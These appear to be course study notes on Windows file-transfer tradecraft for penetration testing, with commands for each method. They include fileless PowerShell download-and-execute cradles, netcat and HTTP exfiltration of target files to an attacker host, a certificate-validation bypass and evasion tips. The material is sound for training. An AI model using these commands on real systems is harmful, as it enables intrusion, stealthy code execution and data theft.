# NOTES — Windows File Transfer Methods

## ID
616

## Module
File Transfers

## Kind
notes

## Title
Section 2 — Windows File Transfer Methods

## Description
Native Windows download/upload techniques — PowerShell (base64, WebClient, Invoke-WebRequest), SMB via Impacket, and FTP — plus common errors and how to bypass them.

## Tags
windows, powershell, smb, ftp, impacket, base64, webclient, invoke-webrequest

## Commands
- `md5sum id_rsa`
- `cat id_rsa | base64 -w 0; echo`
- `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<b64>"))`
- `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`
- `(New-Object Net.WebClient).DownloadFile('<url>','<out>')`
- `IEX (New-Object Net.WebClient).DownloadString('<url>')`
- `Invoke-WebRequest <url> -OutFile <out> -UseBasicParsing`
- `sudo impacket-smbserver share -smb2support /tmp/smbshare`
- `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
- `net use n: \\<ip>\share /user:test test`
- `copy \\<ip>\share\nc.exe`
- `sudo python3 -m pyftpdlib --port 21`
- `(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt','C:\Users\Public\ftp-file.txt')`
- `ftp -v -n -s:ftpcommand.txt`
- `[Convert]::ToBase64String((Get-Content -path "<file>" -Encoding byte))`
- `python3 -m uploadserver`
- `Invoke-FileUpload -Uri http://<ip>:8000/upload -File <path>`
- `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
- `dir \\<ip>\DavWWWRoot`
- `sudo python3 -m pyftpdlib --port 21 --write`
- `(New-Object Net.WebClient).UploadFile('ftp://<ip>/dest','<local>')`

## What This Section Covers
Built-in Windows tooling for both directions. PowerShell is the workhorse (multiple classes/cmdlets, plus fileless tricks via `IEX`), but you also need SMB (Impacket), WebDAV (when SMB is blocked but HTTP isn't), FTP, and the base64 paste-trick for tiny payloads when there's no network path.

## Methodology — Download

### A. Base64 paste (no network needed)
1. On attacker: `md5sum id_rsa` (verify hash later).
2. `cat id_rsa | base64 -w 0; echo` — single line for easy copy.
3. On Windows target (PowerShell): `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<b64>"))`
4. Verify: `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5` — hashes must match.

> **Limit:** `cmd.exe` has an 8,191-char max string length. Web shells can also error on huge strings. Use only for small files (keys, configs, small binaries).

### B. PowerShell Web (HTTP/HTTPS — usually allowed outbound)
- **DownloadFile (to disk):** `(New-Object Net.WebClient).DownloadFile('<url>','<out>')`
- **DownloadFileAsync** — non-blocking variant.
- **DownloadString + IEX (fileless / in-memory):**
  - `IEX (New-Object Net.WebClient).DownloadString('<url>')`
  - or pipeline form: `(New-Object Net.WebClient).DownloadString('<url>') | IEX`
- **Invoke-WebRequest** (PS 3.0+; aliases `iwr`, `curl`, `wget`):
  - `Invoke-WebRequest <url> -OutFile <out>` — slower than `Net.WebClient`.

### C. SMB Download (TCP/445)
1. Attacker: `sudo impacket-smbserver share -smb2support /tmp/smbshare`
2. Target: `copy \\<attacker-ip>\share\nc.exe`

If new Windows versions block unauthenticated guest access:
1. Attacker: `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
2. Target: `net use n: \\<attacker-ip>\share /user:test test`
3. Target: `copy n:\nc.exe`

### D. FTP Download (TCP/21)
1. Attacker: `sudo pip3 install pyftpdlib` then `sudo python3 -m pyftpdlib --port 21`
2. Target (PowerShell): `(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', 'C:\Users\Public\ftp-file.txt')`
3. **Non-interactive shell** — build a command file:
   ```
   echo open <ip> > ftpcommand.txt
   echo USER anonymous >> ftpcommand.txt
   echo binary >> ftpcommand.txt
   echo GET file.txt >> ftpcommand.txt
   echo bye >> ftpcommand.txt
   ftp -v -n -s:ftpcommand.txt
   ```

## Methodology — Upload

### A. Base64 (reverse of download)
- Target (PowerShell): `[Convert]::ToBase64String((Get-Content -path "<file>" -Encoding byte))`
- Attacker: `echo <b64> | base64 -d > <file>` then verify with `md5sum`.

### B. PowerShell Web Upload (PSUpload + uploadserver)
1. Attacker: `pip3 install uploadserver` then `python3 -m uploadserver` (port 8000, `/upload`).
2. Target:
   ```
   IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
   Invoke-FileUpload -Uri http://<ip>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
   ```

### C. Base64 over POST → Netcat catcher
1. Attacker: `nc -lvnp 8000`
2. Target:
   ```
   $b64 = [System.convert]::ToBase64String((Get-Content -Path '<file>' -Encoding Byte))
   Invoke-WebRequest -Uri http://<ip>:8000/ -Method POST -Body $b64
   ```
3. Attacker: copy the b64 body, `echo <b64> | base64 -d -w 0 > <file>`.

### D. SMB Upload via WebDAV (when TCP/445 blocked but HTTP allowed)
1. Attacker: `sudo pip3 install wsgidav cheroot`
2. Attacker: `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
3. Target: `dir \\<ip>\DavWWWRoot` (or use an existing share folder name directly).
4. Target: `copy <local-file> \\<ip>\DavWWWRoot\` or `\\<ip>\<sharefolder>\`

### E. FTP Upload
1. Attacker (writable): `sudo python3 -m pyftpdlib --port 21 --write`
2. Target (PS): `(New-Object Net.WebClient).UploadFile('ftp://<ip>/dest', '<local>')`
3. Or build an FTP command file with `PUT` instead of `GET`.

## Common PowerShell Errors

| Error | Fix |
|-------|-----|
| `Internet Explorer engine is not available` / first-launch config not complete | Add `-UseBasicParsing` to `Invoke-WebRequest`. |
| `Could not establish trust relationship for the SSL/TLS secure channel` | `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}` before the request. |
| New Windows blocks unauthenticated SMB guest | Use SMB with creds: `impacket-smbserver -user test -password test`, then `net use`. |

## WebClient Methods Reference

| Method | Behavior |
|--------|----------|
| `DownloadFile` | Save resource to local file. |
| `DownloadFileAsync` | Same, non-blocking. |
| `DownloadData` | Returns byte array. |
| `DownloadString` | Returns string — pair with `IEX` for fileless execution. |
| `OpenRead` | Returns a `Stream`. |
| `UploadFile` | Upload local file to URL (HTTP/FTP). |

## Lab — Questions & Answers
Source content does not include lab question text or answers (only point values were shown in the pasted material). Lab requires spawning the target VM and trying transfers from your attack host.

## Key Takeaways
- **`Net.WebClient` is faster than `Invoke-WebRequest`** for downloads. Use `IWR` when you need cookies/headers/sessions.
- `IEX (New-Object Net.WebClient).DownloadString(...)` is the canonical **fileless** PowerShell exec — script never touches disk, never lands in a file-write log.
- `DavWWWRoot` is a magic keyword for the WebDAV Mini-Redirector — you don't need that folder to exist on the server. Or just use the real share name.
- SMB negotiation falls back to HTTP automatically when no SMB share is found — that's how WebDAV works "transparently."

## Gotchas
- PowerShell `Net.WebClient` will use proxy settings only if explicitly told to; some cradles bypass corp proxies and get blocked.
- `cmd.exe` 8191-char limit will silently truncate huge base64 strings → corrupt files.
- `net use` over SMB with creds creates a persistent mount — defenders see this in event logs. Use `/delete` to unmount when done.
- WebDAV requires the **WebClient service** running on the target — disabled by default on Windows Server. `net start webclient` may be needed (and may fail without admin).

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-transfers]]
← [[01-introduction]] | [[03-linux-file-transfer-methods]] →
<!-- AUTO-LINKS-END -->
